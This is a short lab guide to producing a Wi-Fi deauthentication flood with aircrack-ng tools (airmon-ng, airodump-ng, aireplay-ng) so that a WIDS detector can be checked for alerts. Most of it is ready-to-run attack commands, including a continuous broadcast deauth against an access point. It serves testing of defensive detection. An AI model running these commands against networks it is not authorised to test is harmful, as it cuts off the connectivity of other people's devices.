## Deauthentication Flood (How to stimulate it in a lab)

> Use only on networks/equipment you own or have explicit permission to test. Deauth attacks can disrupt real Wi‑Fi.

### 0) Prerequisites
- Linux/Kali machine with a Wi‑Fi adapter that supports **monitor mode**
- `aircrack-ng` suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`)
- A target AP (BSSID) and optionally a target client (STA)

### 1) Put the adapter into Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```
You should get a monitor interface like `wlan0mon`. Verify:
```bash
iwconfig
```

### 2) Identify the target AP/client/channel
In one terminal:
```bash
sudo airodump-ng wlan0mon
```
Find:
- **BSSID** (AP MAC)
- **STATION** (client MAC, if present)
- **Channel**

Example placeholders:
- AP BSSID: `AA:BB:CC:DD:EE:FF`
- Client STA: `11:22:33:44:55:66`
- Channel: `6`

(Optional) If you want to force a specific channel while sniffing:
```bash
sudo airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

### 3) Launch the deauth flood
**Option A — deauth all clients from the AP (broadcast):**
```bash
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon --ignore-negative-one
```
- `--deauth 0` = continuous until you stop it.

**Option B — deauth a single client:**
```bash
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon --ignore-negative-one
```
- Increase `--deauth` (e.g., 50/100) if your detector threshold requires a larger burst.

### 4) Stop the attack
- Press `CTRL+C`
- Re-check with `airodump-ng` to see clients reconnect.

### 5) Run your WIDS detector
Run the GUI (or CLI) and set the interface to your monitor device (e.g., `wlan0mon`).

GUI (example):
```bash
sudo python3 wids_gui.py
```
- Select **Live Sniffing**
- Interface: `wlan0mon`
- Click **Start Monitoring**

Expected result: you should see alerts when enough deauthentication management frames are observed within the detector’s time window.

### 6) Troubleshooting
- **No alerts / no packets:** ensure the adapter is really in monitor mode; verify channel.
- **Weak alerts:** increase the deauth count or use continuous mode briefly.
- **High false negatives:** some adapters/drivers may not inject/observe deauth reliably—try a different adapter or restart monitor mode.

